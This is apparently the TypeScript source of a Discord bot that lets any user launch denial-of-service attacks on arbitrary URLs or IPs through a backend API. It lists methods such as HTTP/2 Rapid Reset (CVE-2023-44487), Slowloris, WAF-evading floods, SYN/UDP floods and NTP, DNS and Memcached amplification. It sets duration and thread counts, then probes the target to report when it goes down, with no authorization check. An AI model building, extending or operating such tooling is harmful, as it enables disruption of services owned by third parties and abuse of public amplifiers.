import {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  ChatInputCommandInteraction,
  StringSelectMenuInteraction,
  Message,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  StringSelectMenuBuilder,
  StringSelectMenuOptionBuilder,
  ComponentType,
  Events,
} from "discord.js";
import { BOT_TOKEN, APPLICATION_ID, COLORS, AUTHOR } from "./config.js";
import { api } from "./api.js";
import {
  buildAttackEmbed,
  buildStartEmbed,
  buildStopEmbed,
  buildListEmbed,
  buildStatsEmbed,
  buildAnalyzeEmbed,
  buildMethodsEmbed,
  buildHelpEmbed,
  buildErrorEmbed,
  type ProbeResult,
} from "./embeds.js";

if (!BOT_TOKEN) {
  console.error("❌ DISCORD_BOT_TOKEN is not set. Set it in the environment variables.");
  process.exit(1);
}

// ── Method definitions with layer grouping for the select menu ──────────────
const METHOD_OPTIONS = [
  // ── Geass / Special ────────────────────────────────────────────────────
  { value: "geass-override", label: "👁️ Geass Override ∞",        description: "MAXIMUM POWER — 5 simultaneous vectors (conn+slow+H2+WAF+UDP)", emoji: "👁️" },
  // ── L7 Application ─────────────────────────────────────────────────────
  { value: "waf-bypass",     label: "🟣 Geass WAF Bypass ∞",      description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF",  emoji: "🟣" },
  { value: "http2-flood",    label: "⚡ HTTP/2 Rapid Reset",       description: "CVE-2023-44487 — 64-stream RST burst, millions req/s",           emoji: "⚡" },
  { value: "slowloris",      label: "🐌 Slowloris",               description: "25K half-open connections — starves nginx/apache thread pool",   emoji: "🐌" },
  { value: "conn-flood",     label: "🔗 TLS Connection Flood",     description: "Opens & holds thousands of TLS sockets — pre-HTTP exhaustion",  emoji: "🔗" },
  { value: "http-flood",     label: "🌊 HTTP Flood",               description: "High-volume HTTP GET — overwhelms web server resources",        emoji: "🌊" },
  { value: "http-bypass",    label: "🛡️ HTTP Bypass",             description: "Browser-emulated HTTP flood — bypasses basic bot protection",   emoji: "🛡️" },
  { value: "rudy",           label: "🩸 R.U.D.Y (SlowPOST)",      description: "Claims 1GB body, sends 1 byte/5s — holds server threads forever",emoji: "🩸" },
  // ── L4 Transport ───────────────────────────────────────────────────────
  { value: "udp-flood",      label: "💥 UDP Flood",               description: "Raw UDP packet flood — saturates L4 bandwidth",                 emoji: "💥" },
  { value: "udp-bypass",     label: "🔀 UDP Bypass",              description: "UDP flood with randomized payloads to evade rate limiting",      emoji: "🔀" },
  { value: "syn-flood",      label: "🔌 SYN Flood",               description: "TCP SYN_RECV exhaustion — fills connection table pre-handshake", emoji: "🔌" },
  { value: "tcp-flood",      label: "📡 TCP Flood",               description: "Raw TCP packet flood against open ports",                        emoji: "📡" },
  // ── L3 Amplification ───────────────────────────────────────────────────
  { value: "ntp-amp",        label: "🕐 NTP Amplification [556x]", description: "Monlist NTP abuse — 556× amplification factor",                emoji: "🕐" },
  { value: "dns-amp",        label: "📛 DNS Amplification [54x]",  description: "Open resolver abuse — 54× amplification factor",               emoji: "📛" },
  { value: "mem-amp",        label: "💾 Memcached [51000x]",      description: "Exposed Memcached — up to 51,000× amplification",               emoji: "💾" },
];

// ── Duration presets ─────────────────────────────────────────────────────────
const DURATION_OPTIONS = [
  { value: "30",   label: "30 seconds",   description: "Quick burst test" },
  { value: "60",   label: "1 minute",     description: "Standard attack (default)" },
  { value: "120",  label: "2 minutes",    description: "Extended pressure" },
  { value: "300",  label: "5 minutes",    description: "Sustained assault" },
  { value: "600",  label: "10 minutes",   description: "Maximum duration" },
];

// ── Thread presets ───────────────────────────────────────────────────────────
const THREAD_OPTIONS = [
  { value: "50",   label: "50 threads",   description: "Low — test only" },
  { value: "100",  label: "100 threads",  description: "Medium" },
  { value: "200",  label: "200 threads",  description: "High (default)" },
  { value: "500",  label: "500 threads",  description: "Very High" },
  { value: "1000", label: "1000 threads", description: "Maximum" },
];

// ── Pending launcher sessions (userId → { target, duration, threads }) ───────
interface LaunchSession { target: string; duration: number; threads: number; }
const pendingSessions = new Map<string, LaunchSession>();

// ── Slash Command Definitions ─────────────────────────────────────────────────
const COMMANDS = [
  new SlashCommandBuilder()
    .setName("attack")
    .setDescription("⚔️ Geass Attack Control — launch, stop, and monitor attacks")
    .addSubcommand(sub =>
      sub.setName("start")
        .setDescription("🔴 Launch a new Geass command — opens method/duration/thread selector")
        .addStringOption(opt =>
          opt.setName("target").setDescription("Target URL or IP (e.g. https://example.com)").setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName("stop")
        .setDescription("⏹️ Stop a running attack by ID")
        .addIntegerOption(opt =>
          opt.setName("id").setDescription("Attack ID to stop").setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName("list")
        .setDescription("📋 List all active and recent attacks")
    )
    .addSubcommand(sub =>
      sub.setName("stats")
        .setDescription("📊 Show global aggregate attack statistics")
    ),

  new SlashCommandBuilder()
    .setName("analyze")
    .setDescription("🔍 Analyze a target and get vulnerability recommendations")
    .addStringOption(opt =>
      opt.setName("target").setDescription("Target URL or IP to analyze").setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName("methods")
    .setDescription("⚡ List all available attack vectors")
    .addStringOption(opt =>
      opt.setName("layer")
        .setDescription("Filter by network layer")
        .setRequired(false)
        .addChoices(
          { name: "L7 — Application layer (HTTP, HTTP/2, Slowloris)", value: "L7" },
          { name: "L4 — Transport layer (TCP, UDP, SYN)",             value: "L4" },
          { name: "L3 — Network layer (ICMP, amplification)",         value: "L3" },
        )
    ),

  new SlashCommandBuilder()
    .setName("help")
    .setDescription("❓ Show Lelouch Britannia command guide"),

  new SlashCommandBuilder()
    .setName("geass")
    .setDescription("👁️ Launch Geass Override ∞ — maximum power, 5 simultaneous vectors")
    .addStringOption(opt =>
      opt.setName("target").setDescription("Target URL or IP (e.g. https://example.com)").setRequired(true)
    )
    .addIntegerOption(opt =>
      opt.setName("duration").setDescription("Duration in seconds (default: 60)").setRequired(false).setMinValue(5).setMaxValue(3600)
    )
    .addIntegerOption(opt =>
      opt.setName("threads").setDescription("Base thread count (default: 200)").setRequired(false).setMinValue(1).setMaxValue(2000)
    ),
].map(c => c.toJSON());

// ── Deploy slash commands ─────────────────────────────────────────────────────
async function deployCommands(): Promise<void> {
  const rest = new REST().setToken(BOT_TOKEN);
  try {
    console.log("📡 Registering slash commands with Discord...");
    await rest.put(Routes.applicationCommands(APPLICATION_ID), { body: COMMANDS });
    console.log(`✅ Registered ${COMMANDS.length} slash commands globally.`);
  } catch (err) {
    console.error("❌ Failed to register commands:", err);
    throw err;
  }
}

// ── Target probe helper ───────────────────────────────────────────────────────
async function probeTarget(rawUrl: string): Promise<ProbeResult> {
  let url = rawUrl.trim();
  if (!/^https?:\/\//i.test(url)) url = `https://${url}`;
  const t0 = Date.now();
  try {
    const ctrl  = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 8000);
    const res   = await fetch(url, {
      method:   "HEAD",
      redirect: "follow",
      signal:   ctrl.signal,
      headers:  { "User-Agent": "Mozilla/5.0 (compatible; monitor/1.0)" },
    });
    clearTimeout(timer);
    const latencyMs = Date.now() - t0;
    if (res.status >= 500) {
      return { up: false, latencyMs, reason: `HTTP ${res.status} — origin server error` };
    }
    if (res.status === 429) {
      return { up: false, latencyMs, reason: `HTTP 429 — rate limiter triggered (weakening)` };
    }
    return { up: true, latencyMs };
  } catch (err: unknown) {
    const latencyMs = Date.now() - t0;
    const msg = err instanceof Error ? err.message : String(err);
    if (msg.includes("abort") || msg.includes("timeout") || msg.includes("The operation was aborted")) {
      return { up: false, latencyMs, reason: "Connection timed out — target unresponsive" };
    }
    if (msg.includes("ECONNREFUSED") || msg.includes("refused")) {
      return { up: false, latencyMs, reason: "Connection refused — server process crashed" };
    }
    if (msg.includes("ECONNRESET") || msg.includes("reset")) {
      return { up: false, latencyMs, reason: "Connection reset — kernel socket buffer overflow" };
    }
    if (msg.includes("ENOTFOUND") || msg.includes("NXDOMAIN")) {
      return { up: false, latencyMs, reason: "DNS resolution failed — target unreachable" };
    }
    return { up: false, latencyMs, reason: `Network error: ${msg.slice(0, 80)}` };
  }
}

// ── Live attack monitor ───────────────────────────────────────────────────────
const monitors       = new Map<number, NodeJS.Timeout>();
const prevPackets    = new Map<number, number>();
const targetHistories = new Map<number, ProbeResult[]>();  // attackId → probe history

function startMonitor(attackId: number, msg: Message, target: string): void {
  if (monitors.has(attackId)) return;
  const INTERVAL_SEC = 5;
  targetHistories.set(attackId, []);  // init empty history

  const tick = setInterval(async () => {
    // Probe target + fetch attack state + live conns all in parallel
    const [attack, live, probe] = await Promise.all([
      api.getAttack(attackId),
      api.getLiveConns(attackId).catch(() => ({ conns: 0, running: false })),
      probeTarget(target).catch(() => ({ up: false, latencyMs: 9999, reason: "probe error" } as ProbeResult)),
    ]);

    if (!attack) {
      clearInterval(tick);
      monitors.delete(attackId);
      prevPackets.delete(attackId);
      targetHistories.delete(attackId);
      return;
    }

    // Maintain rolling history (max 30 probes = 2.5 min of history, shows last 20 in sparkline)
    const history = targetHistories.get(attackId) ?? [];
    history.push(probe);
    if (history.length > 30) history.shift();
    targetHistories.set(attackId, history);

    const prev    = prevPackets.get(attackId) ?? attack.packetsSent;
    const delta   = Math.max(0, attack.packetsSent - prev);
    const livePps = delta / INTERVAL_SEC;
    prevPackets.set(attackId, attack.packetsSent);

    try {
      await msg.edit({ embeds: [buildAttackEmbed(attack, livePps, live?.conns ?? 0, history)] });
    } catch { /**/ }

    if (attack.status !== "running") {
      clearInterval(tick);
      monitors.delete(attackId);
      prevPackets.delete(attackId);
      // Keep history for a final render, then clean up after 30s
      setTimeout(() => targetHistories.delete(attackId), 30_000);
    }
  }, INTERVAL_SEC * 1000);
  monitors.set(attackId, tick);
}

// ── Build launcher embed with all 3 dropdowns ─────────────────────────────────
function buildLauncherComponents(target: string) {
  // Row 1 — Method select (max 25 options)
  const methodMenu = new StringSelectMenuBuilder()
    .setCustomId("select_method")
    .setPlaceholder("⚔️ Choose attack method...")
    .addOptions(
      METHOD_OPTIONS.map(m =>
        new StringSelectMenuOptionBuilder()
          .setValue(m.value)
          .setLabel(m.label)
          .setDescription(m.description.slice(0, 100))
      )
    );

  // Row 2 — Duration select
  const durationMenu = new StringSelectMenuBuilder()
    .setCustomId("select_duration")
    .setPlaceholder("⏱ Duration (default: 60s)")
    .addOptions(
      DURATION_OPTIONS.map(d =>
        new StringSelectMenuOptionBuilder()
          .setValue(d.value)
          .setLabel(d.label)
          .setDescription(d.description)
      )
    );

  // Row 3 — Thread select
  const threadMenu = new StringSelectMenuBuilder()
    .setCustomId("select_threads")
    .setPlaceholder("🧵 Threads (default: 200)")
    .addOptions(
      THREAD_OPTIONS.map(t =>
        new StringSelectMenuOptionBuilder()
          .setValue(t.value)
          .setLabel(t.label)
          .setDescription(t.description)
      )
    );

  return [
    new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(methodMenu),
    new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(durationMenu),
    new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(threadMenu),
  ];
}

function buildLauncherEmbed(target: string, session: LaunchSession, selectedMethod?: string): EmbedBuilder {
  const mInfo = selectedMethod ? METHOD_OPTIONS.find(m => m.value === selectedMethod) : null;
  return new EmbedBuilder()
    .setColor(COLORS.GOLD)
    .setTitle("⚔️ GEASS LAUNCHER — Configure Attack")
    .setDescription(
      mInfo
        ? `**${mInfo.label}** selected — configure duration & threads, then click **🚀 LAUNCH**`
        : "Select an **attack method**, then optionally change duration & threads.\nClick **🚀 LAUNCH** when ready."
    )
    .addFields(
      { name: "🎯 Target",    value: `\`${target}\``,                                     inline: false },
      { name: "⚔️ Method",   value: mInfo ? `**${mInfo.label}**` : "_not selected yet_",  inline: true  },
      { name: "⏱ Duration",  value: `**${session.duration}s**`,                           inline: true  },
      { name: "🧵 Threads",  value: `**${session.threads}**`,                             inline: true  },
      { name: "\u200b",      value: "Select method above, then press **🚀 LAUNCH**.",      inline: false },
    )
    .setFooter({ text: AUTHOR })
    .setTimestamp();
}

// ── Command Handlers ──────────────────────────────────────────────────────────
async function handleAttackStart(interaction: ChatInputCommandInteraction): Promise<void> {
  const target  = interaction.options.getString("target", true);
  const userId  = interaction.user.id;

  // Init session with defaults
  const session: LaunchSession = { target, duration: 60, threads: 200 };
  pendingSessions.set(userId, session);

  const components = buildLauncherComponents(target);
  // Row 4 — Launch + Cancel buttons
  const buttonRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId("launch_attack")
      .setLabel("🚀 LAUNCH")
      .setStyle(ButtonStyle.Danger)
      .setDisabled(true), // disabled until method is chosen
    new ButtonBuilder()
      .setCustomId("cancel_launch")
      .setLabel("✖ Cancel")
      .setStyle(ButtonStyle.Secondary),
  );

  await interaction.reply({
    embeds: [buildLauncherEmbed(target, session)],
    components: [...components, buttonRow],
    ephemeral: false,
  });
}

async function handleAttackStop(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  const id = interaction.options.getInteger("id", true);
  console.log(`[ATTACK STOP] ${interaction.user.tag} → #${id}`);
  try {
    const result = await api.stopAttack(id);
    const ok     = result?.ok ?? false;
    const timer  = monitors.get(id);
    if (timer) { clearInterval(timer); monitors.delete(id); }
    await interaction.editReply({ embeds: [buildStopEmbed(id, ok)] });
    console.log(`[ATTACK #${id}] ${ok ? "Stopped" : "Stop failed"}`);
  } catch {
    await interaction.editReply({ embeds: [buildStopEmbed(id, false)] });
  }
}

async function handleAttackList(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  try {
    const attacks = await api.getAttacks();
    await interaction.editReply({ embeds: [buildListEmbed(attacks)] });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("FETCH FAILED", message)] });
  }
}

async function handleAttackStats(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  try {
    const stats = await api.getStats();
    await interaction.editReply({ embeds: [buildStatsEmbed(stats)] });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("STATS FAILED", message)] });
  }
}

async function handleAnalyze(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  const target = interaction.options.getString("target", true);
  console.log(`[ANALYZE] ${interaction.user.tag} → ${target}`);
  await interaction.editReply({
    embeds: [
      new EmbedBuilder()
        .setColor(COLORS.GOLD)
        .setTitle("🔍 SCANNING TARGET...")
        .setDescription(`Analyzing \`${target}\`\nRunning DNS probes, HTTP fingerprinting, CDN detection...`)
        .setFooter({ text: AUTHOR })
    ],
  });
  try {
    const result = await api.analyze(target);
    await interaction.editReply({ embeds: [buildAnalyzeEmbed(result)] });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("ANALYSIS FAILED", message)] });
  }
}

async function handleMethods(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  const layerFilter = interaction.options.getString("layer") ?? undefined;
  try {
    const methods = await api.getMethods();
    await interaction.editReply({ embeds: [buildMethodsEmbed(methods, layerFilter)] });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("METHODS FAILED", message)] });
  }
}

async function handleHelp(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.reply({ embeds: [buildHelpEmbed()] });
}

async function handleGeass(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply();
  const target   = interaction.options.getString("target", true);
  const duration = interaction.options.getInteger("duration") ?? 60;
  const threads  = interaction.options.getInteger("threads")  ?? 200;
  const isHttps  = /^https:/i.test(target);
  const port     = isHttps ? 443 : 80;
  console.log(`[GEASS] ${interaction.user.tag} → ${target} | ${threads}t | ${duration}s`);

  await interaction.editReply({
    embeds: [
      new EmbedBuilder()
        .setColor(COLORS.CRIMSON)
        .setTitle("👁️ LELOUCH vi BRITANNIA COMMANDS YOU...")
        .setDescription(
          `> *"I, Lelouch vi Britannia, hereby command all opposition... TO SUBMIT!"*\n\n` +
          `⚡ **GEASS OVERRIDE** — 5 simultaneous vectors against \`${target}\`\n` +
          `**Conn Flood → Slowloris → HTTP/2 Rapid Reset → WAF Bypass → UDP**`
        )
        .addFields(
          { name: "🎯 Target",  value: `\`${target}\``,        inline: true },
          { name: "⏱ Duration", value: `**${duration}s**`,      inline: true },
          { name: "🧵 Threads", value: `**${threads}** (base)`, inline: true },
          { name: "📊 Status",  value: "🔴 **INITIALIZING VECTORS...**", inline: false },
        )
        .setFooter({ text: AUTHOR })
        .setTimestamp()
    ],
  });

  try {
    const attack = await api.startAttack({ target, method: "geass-override", threads, duration, port });
    console.log(`[GEASS #${attack.id}] Vectors online → ${target}`);
    const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
      new ButtonBuilder().setCustomId(`stop_${attack.id}`).setLabel("⏹️ Stop Geass").setStyle(ButtonStyle.Danger),
    );
    const msg = await interaction.editReply({ embeds: [buildStartEmbed(attack)], components: [row] });
    startMonitor(attack.id, msg as Message, target);
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    await interaction.editReply({ embeds: [buildErrorEmbed("GEASS FAILED", message)] });
  }
}

// ── Select Menu Handler ───────────────────────────────────────────────────────
async function handleSelectMenu(interaction: StringSelectMenuInteraction): Promise<void> {
  const userId  = interaction.user.id;
  const session = pendingSessions.get(userId);
  if (!session) { await interaction.deferUpdate(); return; }

  const value = interaction.values[0];

  if (interaction.customId === "select_method") {
    // Update selected method label in session (store in a parallel map)
    pendingMethodMap.set(userId, value);
  } else if (interaction.customId === "select_duration") {
    session.duration = parseInt(value, 10);
    pendingSessions.set(userId, session);
  } else if (interaction.customId === "select_threads") {
    session.threads = parseInt(value, 10);
    pendingSessions.set(userId, session);
  }

  const currentMethod = pendingMethodMap.get(userId);

  // Rebuild components with Launch button enabled if method is selected
  const components = buildLauncherComponents(session.target);
  const buttonRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId("launch_attack")
      .setLabel("🚀 LAUNCH")
      .setStyle(ButtonStyle.Danger)
      .setDisabled(!currentMethod), // enabled once method is chosen
    new ButtonBuilder()
      .setCustomId("cancel_launch")
      .setLabel("✖ Cancel")
      .setStyle(ButtonStyle.Secondary),
  );

  await interaction.update({
    embeds: [buildLauncherEmbed(session.target, session, currentMethod)],
    components: [...components, buttonRow],
  });
}

// Track selected method separately (not in LaunchSession to keep it clean)
const pendingMethodMap = new Map<string, string>();

// ── Button Interaction Handler ────────────────────────────────────────────────
async function handleButton(interaction: import("discord.js").ButtonInteraction): Promise<void> {
  const { customId } = interaction;

  // ── Launch button ─────────────────────────────────────────────────────────
  if (customId === "launch_attack") {
    const userId  = interaction.user.id;
    const session = pendingSessions.get(userId);
    const method  = pendingMethodMap.get(userId);
    if (!session || !method) {
      await interaction.reply({ content: "❌ Session expired. Run `/attack start` again.", ephemeral: true });
      return;
    }
    pendingSessions.delete(userId);
    pendingMethodMap.delete(userId);

    await interaction.deferUpdate();

    // Disable all components while launching
    await interaction.editReply({ components: [] });

    const { target, duration, threads } = session;
    const isHttps = /^https:/i.test(target);
    const port    = isHttps ? 443 : 80;

    console.log(`[ATTACK START] ${interaction.user.tag} → ${target} | ${method} | ${threads}t | ${duration}s`);

    try {
      const attack = await api.startAttack({ target, method, threads, duration, port });
      const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
        new ButtonBuilder().setCustomId(`stop_${attack.id}`).setLabel("⏹️ Stop Attack").setStyle(ButtonStyle.Danger),
      );
      const msg = await interaction.editReply({ embeds: [buildStartEmbed(attack)], components: [row] });
      console.log(`[ATTACK #${attack.id}] Started — ${method} → ${target}`);
      startMonitor(attack.id, msg as Message, target);
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : String(err);
      await interaction.editReply({ embeds: [buildErrorEmbed("ATTACK FAILED", message)], components: [] });
    }
    return;
  }

  // ── Cancel button ─────────────────────────────────────────────────────────
  if (customId === "cancel_launch") {
    const userId = interaction.user.id;
    pendingSessions.delete(userId);
    pendingMethodMap.delete(userId);
    await interaction.update({
      embeds: [
        new EmbedBuilder()
          .setColor(COLORS.GRAY)
          .setTitle("✖ Launch Cancelled")
          .setDescription("The attack was cancelled.")
          .setFooter({ text: AUTHOR }),
      ],
      components: [],
    });
    return;
  }

  // ── Stop button (existing attacks) ────────────────────────────────────────
  const parts = customId.split("_");
  if (parts[0] === "stop" && parts[1]) {
    const id = parseInt(parts[1], 10);
    await interaction.deferReply({ ephemeral: true });
    try {
      const result = await api.stopAttack(id);
      const ok     = result?.ok ?? false;
      const timer  = monitors.get(id);
      if (timer) { clearInterval(timer); monitors.delete(id); }
      await interaction.editReply({ embeds: [buildStopEmbed(id, ok)] });
      console.log(`[BUTTON] ${interaction.user.tag} stopped attack #${id}`);
    } catch {
      await interaction.editReply({ embeds: [buildStopEmbed(id, false)] });
    }
  }
}

// ── Main ──────────────────────────────────────────────────────────────────────
async function main(): Promise<void> {
  await deployCommands();

  const client = new Client({ intents: [GatewayIntentBits.Guilds] });

  client.once(Events.ClientReady, c => {
    console.log(`\n╔════════════════════════════════════════╗`);
    console.log(`║   👁️  LELOUCH BRITANNIA — ONLINE        ║`);
    console.log(`║   Bot: ${c.user.tag.padEnd(32)} ║`);
    console.log(`║   Servers: ${String(c.guilds.cache.size).padEnd(28)} ║`);
    console.log(`╚════════════════════════════════════════╝\n`);
    console.log(`${AUTHOR}`);
    c.user.setPresence({
      activities: [{ name: "⚔️ /attack start — Choose your vector" }],
      status: "online",
    });
  });

  client.on(Events.InteractionCreate, async interaction => {
    try {
      if (interaction.isStringSelectMenu()) {
        await handleSelectMenu(interaction as StringSelectMenuInteraction);
        return;
      }

      if (interaction.isButton()) {
        await handleButton(interaction as import("discord.js").ButtonInteraction);
        return;
      }

      if (!interaction.isChatInputCommand()) return;

      const { commandName } = interaction;

      if (commandName === "attack") {
        const sub = interaction.options.getSubcommand();
        if (sub === "start")      await handleAttackStart(interaction);
        else if (sub === "stop")  await handleAttackStop(interaction);
        else if (sub === "list")  await handleAttackList(interaction);
        else if (sub === "stats") await handleAttackStats(interaction);
      } else if (commandName === "analyze") {
        await handleAnalyze(interaction);
      } else if (commandName === "methods") {
        await handleMethods(interaction);
      } else if (commandName === "help") {
        await handleHelp(interaction);
      } else if (commandName === "geass") {
        await handleGeass(interaction);
      }
    } catch (err) {
      console.error("[INTERACTION ERROR]", err);
      try {
        const errEmbed = buildErrorEmbed("INTERNAL ERROR", "An unexpected error occurred. Please try again.");
        if (interaction.isRepliable() && !interaction.replied && !interaction.deferred) {
          await interaction.reply({ embeds: [errEmbed], ephemeral: true });
        }
      } catch { /**/ }
    }
  });

  client.on(Events.Error, err => {
    console.error("[CLIENT ERROR]", err);
  });

  await client.login(BOT_TOKEN);
}

main().catch(err => {
  console.error("Fatal error:", err);
  process.exit(1);
});
